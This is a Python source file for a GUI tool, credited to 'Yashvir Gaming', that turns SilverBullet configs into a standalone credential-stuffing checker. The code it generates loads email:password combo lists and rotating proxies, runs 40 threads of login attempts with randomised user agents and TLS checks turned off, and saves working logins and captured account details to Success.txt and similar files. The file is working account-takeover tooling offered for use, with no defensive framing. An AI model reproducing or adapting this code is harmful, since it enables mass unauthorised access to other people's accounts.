import customtkinter as ctk
from tkinter import filedialog, messagebox
import threading, time, os, queue, httpx
import re, json, random, string
from urllib.parse import quote_plus

def random_user_agent():
    uas = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_3_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Safari/605.1.15",
        "Mozilla/5.0 (Linux; Android 14; SM-S908B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 17_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/128.0.6613.92 Mobile/15E148 Safari/604.1",
    ]
    return random.choice(uas)

def format_proxy(proxy):
    proxy = proxy.strip()
    if proxy.startswith(('http://','https://','socks')):
        return proxy
    elif '@' in proxy:
        return proxy
    elif proxy.count(':') == 3:
        ip, port, user, pwd = proxy.split(':')
        return f"http://{user}:{pwd}@{ip}:{port}"
    elif proxy.count(':') == 1:
        return f"http://{proxy}"
    return proxy

def safe_split(combo, sep=':', maxsplit=1):
    parts = combo.split(sep, maxsplit)
    if len(parts) == 2:
        return parts
    return (combo, '')

class SBtoPyGUI(ctk.CTk):
    def __init__(self):
        super().__init__()
        self.title("SB to Python GUI Generator - By Yashvir Gaming")
        self.geometry("860x670")
        self.resizable(True, True)
        ctk.set_appearance_mode('dark')
        ctk.set_default_color_theme('dark-blue')
        self.build_ui()

    def build_ui(self):
        ctk.CTkLabel(self, text="Paste your SilverBullet Script ↓", font=("Segoe UI SemiBold", 20)).pack(pady=(14,3))
        self.paste_box = ctk.CTkTextbox(self, height=300, width=800, font=("Consolas", 15))
        self.paste_box.pack(pady=4, padx=10, fill="both")
        self.paste_box.insert("end", "# Paste your SB script here\n")
        gen_btn = ctk.CTkButton(self, text="Generate Python Checker", command=self.on_generate, font=("Segoe UI Semibold", 16))
        gen_btn.pack(pady=18)
        self.status_lbl = ctk.CTkLabel(self, text="", font=("Segoe UI", 14), text_color="#ffa500")
        self.status_lbl.pack(pady=8)
        credits = ctk.CTkLabel(self, text="Made with ♥ by Yashvir Gaming | Paste SB script and click Generate.\nThe checker will be generated as GeneratedChecker.py in this folder.", font=("Segoe UI", 12), text_color="#aaa")
        credits.pack(pady=4)

    def on_generate(self):
        sb_text = self.paste_box.get("1.0", "end").strip()
        if not sb_text or len(sb_text) < 30:
            self.status_lbl.configure(text="❌ Please paste a valid SilverBullet script.", text_color="#ff5959")
            return
        self.status_lbl.configure(text="Generating... Please wait.", text_color="#ffa500")
        self.update()
        try:
            py_code = self.parse_sb_script(sb_text)
            with open("GeneratedChecker.py", "w", encoding="utf-8") as f:
                f.write(py_code)
            self.status_lbl.configure(text="✅ Done! Saved as GeneratedChecker.py", text_color="#59e659")
        except Exception as ex:
            self.status_lbl.configure(text=f"Error: {ex}", text_color="#ff5959")

    def parse_sb_script(self, sb_text):
        # --- STEP 1: Parse SB Components ---
        requests = []
        headers = {}
        post_data = None
        keychecks = {"success": [], "fail": [], "retry": [], "expired": [], "free": [], "custom": []}
        captures = []
        script_name = "Checker"

        lines = sb_text.strip().splitlines()
        mode = None

        for line in lines:
            l = line.strip()
            # Requests
            if l.startswith("REQUEST "):
                if "POST" in l:
                    method = "POST"
                    url = re.findall(r'"([^"]+)"', l)[0]
                    requests.append((method, url))
                    mode = "post"
                elif "GET" in l:
                    method = "GET"
                    url = re.findall(r'"([^"]+)"', l)[0]
                    requests.append((method, url))
                    mode = "get"
            # Headers
            elif l.startswith("HEADER "):
                raw = l[7:].strip()
                # Remove any leading/trailing quotes
                if raw.startswith('"') and raw.endswith('"'):
                    raw = raw[1:-1]
                if ":" in raw:
                    k, v = raw.split(":", 1)
                    k = k.strip()
                    v = v.strip()
                    # Replace <UA> with random_user_agent() at codegen time
                    if "<UA>" in v:
                        v = "RANDOM_UA"
                    headers[k] = v
            # Content/Payload
            elif l.startswith("CONTENT") or l.startswith("STRINGCONTENT"):
                post_data = l.split(" ", 1)[1].strip('"')
            # Keychecks
            elif l.startswith("KEYCHAIN "):
                ktype = l.split(" ")[1].lower()
                mode = ktype
            elif l.startswith("KEY "):
                if mode in keychecks:
                    val = l.split(" ", 1)[1].strip('"')
                    keychecks[mode].append(val)
            # Auto-captures
            elif l.startswith("PARSE") and "CAP" in l:
                # LR Parse
                m_lr = re.match(r'PARSE\s+"<SOURCE>"\s+LR\s+"(.*?)"\s+"(.*?)".*?->\s*CAP\s*"([\w\d _-]+)"', l)
                # JSON Parse
                m_json = re.match(r'PARSE\s+"<SOURCE>"\s+JSON\s+"(.*?)".*?->\s*CAP\s*"([\w\d _-]+)"', l)
                # Regex Parse
                m_re = re.match(r'PARSE\s+"<SOURCE>"\s+REGEX\s+"(.*?)".*?->\s*CAP\s*"([\w\d _-]+)"', l)
                if m_lr:
                    left, right, cap = m_lr.groups()
                    captures.append(('lr', left, right, cap))
                elif m_json:
                    field, cap = m_json.groups()
                    captures.append(('json', field, cap))
                elif m_re:
                    reg, cap = m_re.groups()
                    captures.append(('regex', reg, cap))

        # --- STEP 2: Generate Python Checker Code ---
        py_lines = []
        py_lines.append('import httpx, threading, queue, time')
        py_lines.append('from urllib.parse import quote_plus')
        py_lines.append('import customtkinter as ctk')
        py_lines.append('from tkinter import filedialog, messagebox')
        py_lines.append('import random, re')
        py_lines.append('')
        py_lines.append('def random_user_agent():')
        py_lines.append('    uas = [')
        py_lines.append('        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",')
        py_lines.append('        "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_3_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Safari/605.1.15",')
        py_lines.append('        "Mozilla/5.0 (Linux; Android 14; SM-S908B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Mobile Safari/537.36",')
        py_lines.append('        "Mozilla/5.0 (iPhone; CPU iPhone OS 17_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/128.0.6613.92 Mobile/15E148 Safari/604.1",')
        py_lines.append('    ]')
        py_lines.append('    return random.choice(uas)')
        py_lines.append('')
        py_lines.append('def format_proxy(proxy):')
        py_lines.append('    proxy = proxy.strip()')
        py_lines.append("    if proxy.startswith(('http://','https://','socks')): return proxy")
        py_lines.append("    elif '@' in proxy: return proxy")
        py_lines.append("    elif proxy.count(':') == 3:")
        py_lines.append("        ip, port, user, pwd = proxy.split(':'); return f'http://{user}:{pwd}@{ip}:{port}'")
        py_lines.append("    elif proxy.count(':') == 1: return f'http://{proxy}'")
        py_lines.append("    return proxy")
        py_lines.append('')
        py_lines.append('def safe_split(combo, sep=":", maxsplit=1):')
        py_lines.append('    parts = combo.split(sep, maxsplit)')
        py_lines.append('    if len(parts) == 2: return parts')
        py_lines.append('    return (combo, "")')
        py_lines.append('')
        py_lines.append('class CheckerApp(ctk.CTk):')
        py_lines.append('    def __init__(self):')
        py_lines.append('        super().__init__()')
        py_lines.append('        self.title("Generated Checker GUI")')
        py_lines.append('        self.geometry("800x570")')
        py_lines.append('        self.combos, self.proxies = [], []')
        py_lines.append('        self.stats = {"hit":0,"fail":0,"retry":0,"expired":0,"free":0,"custom":0,"checked":0,"cpm":0}')
        py_lines.append('        self.checked_times = []')
        py_lines.append('        self.threads = 40')
        py_lines.append('        self.stop_flag = threading.Event()')
        py_lines.append('        self.proxy_on = ctk.BooleanVar(value=True)')
        py_lines.append('        self.build_ui()')
        py_lines.append('    def build_ui(self):')
        py_lines.append('        ctk.set_appearance_mode("dark"); ctk.set_default_color_theme("dark-blue")')
        py_lines.append('        ctk.CTkLabel(self, text="Generated Checker", font=("Segoe UI Semibold", 22)).pack(pady=12)')
        py_lines.append('        top = ctk.CTkFrame(self, fg_color="#1e1e1e"); top.pack(pady=8)')
        py_lines.append('        ctk.CTkButton(top, text="Load Combos", command=self.load_combos).pack(side="left", padx=7, pady=7)')
        py_lines.append('        ctk.CTkButton(top, text="Load Proxies", command=self.load_proxies).pack(side="left", padx=7, pady=7)')
        py_lines.append('        ctk.CTkButton(top, text="Start", command=self.start_check).pack(side="left", padx=8, pady=7)')
        py_lines.append('        ctk.CTkButton(top, text="Stop", command=self.stop_check).pack(side="left", padx=8, pady=7)')
        py_lines.append('        ctk.CTkButton(top, text="Credits", command=self.show_credits).pack(side="left", padx=10, pady=7)')
        py_lines.append('        self.output_box = ctk.CTkTextbox(self, width=730, height=270, font=("Consolas", 13))')
        py_lines.append('        self.output_box.pack(pady=12)')
        py_lines.append('        stats_bar = ctk.CTkFrame(self, fg_color="#1e1e1e")')
        py_lines.append('        stats_bar.pack(pady=7)')
        py_lines.append('        self.hit_lbl = ctk.CTkLabel(stats_bar, text="Hits: 0", text_color="#24e657", font=("Segoe UI Semibold", 16))')
        py_lines.append('        self.fail_lbl = ctk.CTkLabel(stats_bar, text="Fails: 0", text_color="#f04747", font=("Segoe UI Semibold", 16))')
        py_lines.append('        self.retry_lbl = ctk.CTkLabel(stats_bar, text="Retries: 0", text_color="#ffaa00", font=("Segoe UI Semibold", 16))')
        py_lines.append('        self.expired_lbl = ctk.CTkLabel(stats_bar, text="Expired: 0", text_color="#ffff60", font=("Segoe UI Semibold", 16))')
        py_lines.append('        self.free_lbl = ctk.CTkLabel(stats_bar, text="Free: 0", text_color="#3cb8e5", font=("Segoe UI Semibold", 16))')
        py_lines.append('        self.cpm_lbl = ctk.CTkLabel(stats_bar, text="CPM: 0", text_color="#ffa500", font=("Segoe UI Semibold", 16))')
        py_lines.append('        for w in [self.hit_lbl, self.fail_lbl, self.expired_lbl, self.free_lbl, self.retry_lbl, self.cpm_lbl]: w.pack(side="left", padx=14)')
        py_lines.append('        self.after(1000, self.update_stats_loop)')
        py_lines.append('    def update_stats_loop(self):')
        py_lines.append('        self.hit_lbl.configure(text=f"Hits: {self.stats[\'hit\']}")')
        py_lines.append('        self.fail_lbl.configure(text=f"Fails: {self.stats[\'fail\']}")')
        py_lines.append('        self.retry_lbl.configure(text=f"Retries: {self.stats[\'retry\']}")')
        py_lines.append('        self.expired_lbl.configure(text=f"Expired: {self.stats[\'expired\']}")')
        py_lines.append('        self.free_lbl.configure(text=f"Free: {self.stats[\'free\']}")')
        py_lines.append('        self.cpm_lbl.configure(text=f"CPM: {self.stats[\'cpm\']}")')
        py_lines.append('        self.after(1000, self.update_stats_loop)')
        py_lines.append('    def log(self, msg, color="white"):')
        py_lines.append('        self.output_box.configure(state="normal")')
        py_lines.append('        self.output_box.insert("end", msg + "\\n")')
        py_lines.append('        self.output_box.see("end")')
        py_lines.append('        self.output_box.configure(state="disabled")')
        py_lines.append('    def load_combos(self):')
        py_lines.append('        file = filedialog.askopenfilename(filetypes=[("Combo List", "*.txt"), ("All Files", "*.*")])')
        py_lines.append('        if file:')
        py_lines.append('            with open(file, "r", encoding="utf-8") as f:')
        py_lines.append('                self.combos = [l.strip() for l in f if ":" in l]')
        py_lines.append('    def load_proxies(self):')
        py_lines.append('        file = filedialog.askopenfilename(filetypes=[("Proxy List", "*.txt"), ("All Files", "*.*")])')
        py_lines.append('        if file:')
        py_lines.append('            with open(file, "r", encoding="utf-8") as f:')
        py_lines.append('                self.proxies = [l.strip() for l in f if l.strip()]')
        py_lines.append('    def show_credits(self):')
        py_lines.append('        messagebox.showinfo("Credits", "Made with Love ♥ by Yashvir Gaming\\nTelegram: @therealyashvirgaming")')
        py_lines.append('    def start_check(self):')
        py_lines.append('        self.stop_flag.clear(); self.stats = dict(hit=0,fail=0,retry=0,expired=0,free=0,custom=0,checked=0,cpm=0); self.checked_times = []')
        py_lines.append('        threading.Thread(target=self.run_checker, daemon=True).start()')
        py_lines.append('    def stop_check(self):')
        py_lines.append('        self.stop_flag.set()')
        py_lines.append('    def run_checker(self):')
        py_lines.append('        combo_q = queue.Queue()')
        py_lines.append('        for combo in self.combos: combo_q.put(combo)')
        py_lines.append('        proxy_q = queue.Queue()')
        py_lines.append('        for p in self.proxies: proxy_q.put(p)')
        py_lines.append('        threads = []')
        py_lines.append('        def worker():')
        py_lines.append('            while not self.stop_flag.is_set():')
        py_lines.append('                try: combo = combo_q.get(timeout=2)')
        py_lines.append('                except queue.Empty: break')
        py_lines.append('                email, password = safe_split(combo)')
        py_lines.append('                proxy_dict = None')
        py_lines.append('                if self.proxy_on.get() and not proxy_q.empty():')
        py_lines.append('                    proxy_raw = proxy_q.get()')
        py_lines.append('                    proxy_url = format_proxy(proxy_raw)')
        py_lines.append('                    proxy_dict = {"http://": proxy_url, "https://": proxy_url}')
        py_lines.append('                    proxy_q.put(proxy_raw)')
        py_lines.append('                result = self.check(email, password, proxy_dict)')
        py_lines.append('                self.checked_times.append(time.time())')
        py_lines.append('                if result["status"] in self.stats:')
        py_lines.append('                    self.stats[result["status"]] += 1')
        py_lines.append('                self.stats["checked"] += 1')
        py_lines.append('                self.log(f"{email}:{password} | {result[\'status\']} | {result.get(\'info\',\'\')}", color="green" if result["status"]=="success" else "red")')
        py_lines.append('                # Write to file by status')
        py_lines.append('                if result["status"]=="success":')
        py_lines.append('                    with open("Success.txt","a",encoding="utf-8") as f: f.write(f"{email}:{password} | {result.get(\'info\',\'\')}\\n")')
        py_lines.append('                elif result["status"]=="expired":')
        py_lines.append('                    with open("Expired.txt","a",encoding="utf-8") as f: f.write(f"{email}:{password} | {result.get(\'info\',\'\')}\\n")')
        py_lines.append('                elif result["status"]=="free":')
        py_lines.append('                    with open("Free.txt","a",encoding="utf-8") as f: f.write(f"{email}:{password} | {result.get(\'info\',\'\')}\\n")')
        py_lines.append('                elif result["status"]=="custom":')
        py_lines.append('                    with open("Custom.txt","a",encoding="utf-8") as f: f.write(f"{email}:{password} | {result.get(\'info\',\'\')}\\n")')
        py_lines.append('                self.checked_times = [t for t in self.checked_times if t > time.time()-60]')
        py_lines.append('                self.stats["cpm"] = len(self.checked_times)')
        py_lines.append('        for _ in range(self.threads):')
        py_lines.append('            t = threading.Thread(target=worker, daemon=True); threads.append(t); t.start()')
        py_lines.append('        for t in threads: t.join()')
        py_lines.append('    def check(self, email, password, proxy_dict=None):')
        py_lines.append('        try:')
        if not requests:
            py_lines.append('            return {"status":"fail"}')
        else:
            method, url = requests[0]
            py_lines.append(f'            url = "{url}"')
            py_lines.append('            headers = {')
            for k, v in headers.items():
                k_clean = k.strip(' "\'')
                v_clean = v.strip(' "\'')
                # Skip Content-Length, let httpx handle it
                if k_clean.lower() == "content-length":
                    continue
                # Detect random User-Agent
                if "<UA>" in v_clean or "<User-Agent>" in v_clean or "user-agent" in k_clean.lower():
                    py_lines.append(f'                "{k_clean}": random_user_agent(),')
                elif "<USER>" in v_clean or "<PASS>" in v_clean:
                    py_lines.append(f'                "{k_clean}": f"{v_clean}".replace("<USER>", email).replace("<PASS>", password),')
                else:
                    # Use json.dumps for correct escaping
                    py_lines.append(f'                "{k_clean}": {json.dumps(v_clean)},')
            py_lines.append('            }')
            if post_data:
                py_lines.append('            data = f"' + post_data.replace("<USER>", "{email}").replace("<PASS>", "{password}") + '"')
            else:
                py_lines.append('            data = None')
            py_lines.append('            with httpx.Client(proxies=proxy_dict, timeout=18, verify=False, follow_redirects=True) as client:')
            if method == "POST":
                py_lines.append('                resp = client.post(url, headers=headers, data=data)')
            else:
                py_lines.append('                resp = client.get(url, headers=headers)')
            py_lines.append('            rtext = resp.text')

            # CAPTURE LOGIC
            if captures:
                py_lines.append('            captures = {}')
                for typ, *args in captures:
                    if typ == "lr":
                        left, right, cap = args
                        py_lines.append(f'            try: captures["{cap}"] = rtext.split({repr(left)},1)[1].split({repr(right)},1)[0]\n            except: captures["{cap}"] = ""')
                    elif typ == "json":
                        field, cap = args
                        py_lines.append(f'            try: captures["{cap}"] = resp.json().get({repr(field)}, "")\n            except: captures["{cap}"] = ""')
                    elif typ == "regex":
                        pattern, cap = args
                        py_lines.append(f'            try: captures["{cap}"] = re.search(r{repr(pattern)}, rtext).group(1)\n            except: captures["{cap}"] = ""')
                info_string = ' | '.join([f"{cap}: {{{{captures.get('{cap}','')}}}}" for *_, cap in captures])
            else:
                py_lines.append('            captures = {}')
                info_string = ""
            # KEYCHECKS
            for ktype, keys in keychecks.items():
                for key in keys:
                    py_lines.append(f'            if {repr(key)} in rtext:')
                    if ktype in ["success", "custom"]:
                        py_lines.append(f'                return {{"status":"{ktype}","info":f"{info_string}"}}')
                    else:
                        py_lines.append(f'                return {{"status":"{ktype}"}}')
            py_lines.append('            return {"status":"fail"}')
        py_lines.append('        except Exception as ex:')
        py_lines.append('            print("Exception:", ex)')
        py_lines.append('            return {"status":"retry"}')
        py_lines.append('')
        py_lines.append('if __name__ == "__main__":')
        py_lines.append('    app = CheckerApp()')
        py_lines.append('    app.mainloop()')
        return "\n".join(py_lines)

if __name__ == '__main__':
    app = SBtoPyGUI()
    app.mainloop()
